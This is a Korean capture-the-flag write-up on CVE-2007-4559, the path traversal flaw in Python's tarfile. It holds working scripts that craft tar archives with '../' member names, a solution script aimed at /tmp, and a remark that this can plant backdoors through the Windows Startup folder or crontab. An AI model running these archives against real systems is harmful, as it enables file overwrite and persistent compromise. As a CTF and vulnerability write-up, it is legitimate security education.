# python_tar

CVE-2007-4559 취약점을 활용하는 문제이다.

```python
import tarfile
 def change_name(tarinfo):
    tarinfo.name = "../b/" + tarinfo.name
    return tarinfo
 with tarfile.open("test.tar", "w:xz") as tar:
    tar.add("test.txt", filter=change_name)
```

위와 같이 tar 내부에 존재하는 이름을 수정한 tar 파일을 만들고

```python
import tarfile
 with tarfile.open("test.tar", "r") as tar:
    tar.extractall()
```

해당 파일을 extract하면 그 경로로 압축 해제된다.

만약 최고 권한으로 실행되어 있다면 윈도우는 `C:\Users\사용자 계정\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` 경로에 압축을 풀어서 백도어를 심을 수 있고, 리눅스에서는 `crontab` 파일을 덮어서 백도어로 활용할 수 있겠다.

```
hyuunnn@hyuunnn:/mnt/c/Users/hyuunnnn/Desktop/cve-2007-4559/a$ tar -xvf test.tar
tar: Removing leading `../' from member names
tar: ../b/test.txt: Member name contains '..'
tar: Exiting with failure status due to previous errors
```

tar 명령어의 문제가 아닌 `tarfile` 라이브러리의 문제임을 확인할 수 있다.

https://github.com/microsoft/GRTr/pull/7/files - `safe_extract` 함수를 보면 `tar.getmembers()`를 사용하여 루프 돌면서 경로가 맞는지 확인한다.

## 문제 풀이

1. 문제 파일로 주어진 `run.py` 코드를 분석
2. `flag.txt` 파일을 만들어서 위 코드에서 요구하는 문자로 저장
3. `make_tar.py`를 실행하여 tar 파일 생성

```python
## make_tar.py
import tarfile

def change_name(tarinfo):
    tarinfo.name = "../../../../../../tmp/" + tarinfo.name
    return tarinfo

with tarfile.open("test.tar", "w:xz") as tar:
    tar.add("flag.txt", filter=change_name)
```

4. 생성된 tar 파일을 웹 서버에 업로드하면 `FLAG`가 출력된다.

## 관련 자료

https://www.bleepingcomputer.com/news/security/unpatched-15-year-old-python-bug-allows-code-execution-in-350k-projects/

https://discuss.python.org/t/policies-for-tarfile-extractall-a-k-a-fixing-cve-2007-4559/23149

https://github.com/python/cpython/issues/45385

https://www.trellix.com/en-us/about/newsroom/stories/research/the-bug-report-september-2022-edition.html#CVE-2007-4559

https://www.trellix.com/en-us/about/newsroom/stories/research/limiting-the-software-supply-chain-attack-surface.html

https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html

https://www.cwn.kr/news/articleView.html?idxno=12545

https://github.com/advanced-threat-research/Creosote

https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall

https://www.theregister.com/2022/09/22/python_vulnerability_tarfile/

https://github.com/microsoft/GRTr/pull/7/files https://github.com/tensorflow/privacy/pull/344/files
